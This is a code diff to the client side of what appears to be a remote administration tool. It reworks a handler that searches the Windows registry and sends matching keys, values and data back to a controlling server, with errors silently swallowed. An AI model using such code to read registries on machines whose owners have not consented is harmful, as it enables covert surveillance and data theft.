@@ -19,20 +19,35 @@ namespace xClient.Core.Commands
 
                 xClient.Core.Packets.ClientPackets.GetRegistryKeysResponse responsePacket = new Packets.ClientPackets.GetRegistryKeysResponse();
 
-                // If the search parameters of the packet is null, the server is requesting to obtain the root keys.
-                if (packet.SearchParameters == null)
-                {
-                    packet.SearchParameters = new RegistrySeekerParams(RegistrySeeker.ROOT_KEYS, Enums.RegistrySearchAction.Keys | Enums.RegistrySearchAction.Values);
-                    responsePacket.IsRootKey = true;
-                }
-
                 seeker.SearchComplete += (object o, SearchCompletedEventArgs e) =>
                         {
-                            responsePacket.Matches = e.Matches.ToArray();
+                            responsePacket.Key = new string[e.Matches.Count];
+                            responsePacket.Value = new string[e.Matches.Count];
+                            responsePacket.Data = new string[e.Matches.Count];
+
+                            int i = 0;
+                            foreach (RegSeekerMatch match in e.Matches)
+                            {
+                                responsePacket.Key[i] = match.Key;
+                                responsePacket.Value[i] = match.Value;
+                                responsePacket.Data[i] = match.Data;
+
+                                i++;
+                            }
+
                             responsePacket.Execute(client);
                         };
 
-                seeker.Start(packet.SearchParameters);
+                // If the search parameters of the packet is null, the server is requesting to obtain the root keys.
+                if (packet.RootKeyNames == null)
+                {
+                    responsePacket.IsRootKey = true;
+                    seeker.Start(new RegistrySeekerParams(RegistrySeeker.ROOT_KEYS, Enums.RegistrySearchAction.Keys | Enums.RegistrySearchAction.Values));
+                }
+                else
+                {
+                    seeker.Start(packet.RootKeyNames);
+                }
             }
             catch
             { }
